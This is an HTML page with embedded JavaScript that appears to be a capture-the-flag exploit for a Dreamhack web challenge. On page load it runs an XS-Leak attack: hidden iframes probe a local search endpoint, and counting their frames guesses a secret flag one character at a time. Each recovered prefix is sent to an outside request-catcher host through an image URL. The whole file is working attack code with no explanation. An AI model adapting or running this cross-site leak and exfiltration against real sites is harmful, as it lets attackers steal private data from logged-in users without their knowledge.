<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function search(query) {
        return new Promise((resolve) => {
            let iframe = document.createElement("iframe");
            iframe.src = "http://127.0.0.1:8000/search?query=" + query;
            iframe.style.display = "none";
            document.body.appendChild(iframe);
            let removed = false;

            function removeIframe() {
                if (!removed) {
                    removed = true;
                    document.body.removeChild(iframe);
                }
            }

            iframe.onload = () => {
                try {
                    let result = iframe.contentWindow.frames.length;
                    removeIframe();
                    return resolve(result > 0);
                } catch (e) {
                    removeIframe();
                    return resolve(false);
                }
            };

            setTimeout(() => {
                removeIframe();
                return resolve(false);
            }, 1000);
        });
    }

    async function exploit() {
        let chars = "0123456789abcdef}";
        let secret = "DH{";

        while (!secret.includes("}")) {
            let promises = chars.split("").map(c =>
                search(secret + c).then(result => ({ char: c, success: result }))
            );
            let results = await Promise.all(promises);

            let found = false;

            for (let rslt of results) {
                if (rslt.success) {
                    secret += rslt.char;
                    found = true;
                    img.src = `https://bxizyau.request.dreamhack.games/${secret}`;
                    break;
                }
            }

            if (!found) {
                img.src = `https://bxizyau.request.dreamhack.games/failed`;
                throw new Error("Not found");
            }
        }
    }

    exploit();
</script>
